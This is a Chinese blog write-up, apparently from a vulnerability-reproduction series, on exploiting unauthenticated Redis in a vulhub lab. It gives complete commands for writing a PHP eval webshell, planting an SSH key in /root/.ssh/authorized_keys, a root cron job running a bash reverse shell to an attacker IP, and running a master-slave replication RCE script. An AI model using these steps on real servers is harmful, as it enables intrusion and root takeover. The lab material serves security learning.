[合集 \- 漏洞复现(4\)](https://github.com)[1\.mysql弱密码爆破10\-28](https://github.com/left-shoulder/p/18511384)[2\.Tomcat弱口令上传war包10\-27](https://github.com/left-shoulder/p/18509031)[3\.Hadoop未授权访问11\-01](https://github.com/left-shoulder/p/18521194)4\.Redis未授权访问11\-03收起
# Redis未授权访问


 环境：vulhub\-master/redis/4\-unacc


 启动：



```
docker-compose up -d

```

### 未授权访问


1. namp探测端口，发现开启了redis服务



```
namp -sV -Pn -p- 靶机IP

```

![image-20241028233546812](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241028233546812.png)
2. redis客户端连接（这里没有设置密码，可以直接连接）



```
# 连接靶机的Redis服务器：
redis-cli -h [hostname] -p [port] -a [password]

[hostname]：Redis服务器地址。
[port]：Redis服务端口号，默认为6379。
[password]：Redis服务器密码，这里为空

# nc也可以连接
nc your-ip port

```

  成功连接上redis！


![image-20241028233920665](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241028233920665.png)
### 进一步利用


 主要有四种利用方式：


1. 写入webshell
2. 写ssh公钥
3. 写定时任务
4. redis主从复制


#### 写入webshell


 **先决条件**：


1. 知道网站根目录绝对路径，不然找不到webshell
2. 对目标网站有写入的权限，否则无法写入webshell


 **存在的问题**：


1. 网站的绝对路径难找，大多没有写入权限
2. redis一般配合java网站需要写入jsp木马
3. redis所在的服务器可能根本没有web服务


 **利用**：


​ 1\.namp扫描端口



```
nmap -sV -Pn -T4 -p1-10000 靶机ip

```

  这里看见开放了8080端口


![image-20241030232456518](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241030232456518.png)
​ 2\.目录扫描发现网站绝对路径


![image-20241030232456518](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241030232456518.png)
​ 3\.连接靶机redis服务



```
redis-cli -h 靶机ip -p 6379

```

![image-20241030232619467](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241030232619467.png)
​ 4\.写入webshell



```
 # 设置redis库文件写入到/var/www/html目录，该目录是httpd服务的默认路径
config set dir /var/www/html

# 设置写入的文件名，这里需要写入一个php的一句话木马，故而使用php后缀
config set dbfilename shell.php

# 写入webshell
set x "php</span @eval($_POST['cmd']);?>"

# 保存
save

```

![image-20241030233057137](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241030233057137.png)
​ 5\.访问shell.php并执行命令


​    成功显示phpinfo，webshell写入成功！


![image-20241030233338696](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241030233338696.png)
#### 写ssh公钥


 **原理**？


  攻击机生成一对公私钥，通过redis未授权漏洞将公钥写入靶机的/root/.ssh中，再通过ssh的私钥远程控制靶机


 **存在的问题**：


1. ssh配置文件不允许root用户登录
2. ssh不一定允许互联网连接
3. redis所在的服务器可能根本没有ssh


 **利用**：


  1\.攻击机生成SSH公钥和私钥保存到 /root/.ssh/ 目录



```
ssh-keygen -q -t rsa -f /root/.ssh/id_rsa -N ''

```

![image-20241031134832726](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241031134832726.png)
* id\_rsa.pub为公钥（传到靶机），id\_rsa为私钥（攻击机保留）


![image-20241031135056850](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241031135056850.png)
  2\.进入/root/.ssh/目录，在 id\_rsa.pub 公钥内容前后加入换行符 **"\\n\\n"**，保存到 /tmp/foo.txt 文件



```
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/foo.txt

```

![image-20241031135227687](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241031135227687.png)
  3\.将 /tmp/foo.txt 文件的内容（公钥），保存在redis中（这个时候只保存在了内存中）



```
# 键eval对应的值为生成的公钥内容
cat /tmp/foo.txt | redis-cli -h 靶机ip -p 6379 -x set eval

# 连接redis
redis-cli -h 靶机ip -p 6379

# 看看成功写入了没
get m

```

![image-20241031135530361](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241031135530361.png)
  4\.设置redis的路径为/root/.ssh/，保存文件名为authorized\_keys，这一步是为了将公钥保存在文件中。



```
# 设置路径
config set dir /root/.ssh/

# 文件名必须是authorized_keys
config set dbfilename "authorized_keys"

save

```

![image-20241031135625675](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241031135625675.png)
  5\.最后ssh远程连接靶机即可（私钥登录）



```
ssh 靶机ip -p 端口 -i ~/.ssh/id_rsa

```

![image-20241031140410689](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241031140410689.png)
#### 写定时任务


 原理？


  连接服务端的redis，写入反弹shell的计划任务


 利用：


* 用户定时任务位置：




| 操作系统 | 定时任务位置 |  |
| --- | --- | --- |
| Debian ubuntu | /var/spool/cron/crontabs/用户名 |  |
| centos redhat | /var/spool/cron/用户名 |  |



```
# 连接靶机redis
redis-cli -h 靶机ip -p 6379

# 设置路径（这个目录具体根据操作系统来定）
config set dir /var/spool/cron

# 覆盖root定时任务，便于以root身份执行计划任务
config set dbfilename root

# 写入反弹shell（每分钟由root用户执行一次）
set xxx "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/攻击机ip/6666 0>&1\n\n"

save

```

![image-20241101093203843](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241101093203843.png)
* 攻击机监听6666端口，等反弹shell



```
nc -lnvp 6666

```

#### 主从复制RCE


* windows只能用主从复制打


 **原理？**



```
# 主从复制
	Redis 支持主从复制，用于数据的高可用和备份。配置为“从库”的 Redis 实例会从“主库”同步数据，复制的过程是通过主库将数据同步给从库完成的。
	
# 漏洞原理
	攻击者通过伪装成一个 Redis 主库，诱导目标 Redis 实例充当从库角色，使目标实例连接并同步攻击者的伪造主库数据。在同步数据的过程中，攻击者可以注入包含恶意命令的数据，当目标 Redis 解析并执行这些数据时，便会触发代码执行漏洞。

```

 **利用：**


​ 1\.通过脚本利用


![image-20241101121639967](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241101121639967.png)

```
# 下载脚本
git clone https://github.com/0671/RabR.git

# 进入文件夹
cd RabR

# 使用脚本
python redis-attack.py -r 目标ip -p 目标端口 -L 攻击机ip -b


```

   脚本可以RCE，反弹shell


![image-20241101122047509](https://left-shoulder.oss-cn-huhehaote.aliyuncs.com/img/image-20241101122047509.png)
#### 总结：


  最常用的是写定时任务和主从复制，因为linux都有定时任务，而windows可以利用主从复制getshell


  * [Redis未授权访问](#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE)
* [未授权访问](#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE)
* [进一步利用](#%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8)
* [写入webshell](#%E5%86%99%E5%85%A5webshell)
* [写ssh公钥](#%E5%86%99ssh%E5%85%AC%E9%92%A5):[veee加速器](https://youhaochi.com)
* [写定时任务](#%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1)
* [主从复制RCE](#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6rce)
* [总结：](#%E6%80%BB%E7%BB%93)

   ![](https://github.com/cnblogs_com/blogs/831478/galleries/2422693/o_240923102931_1.png)    - **本文作者：** [left\_shoulder](https://github.com)
 - **本文链接：** [https://github.com/left\-shoulder/p/18523791](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
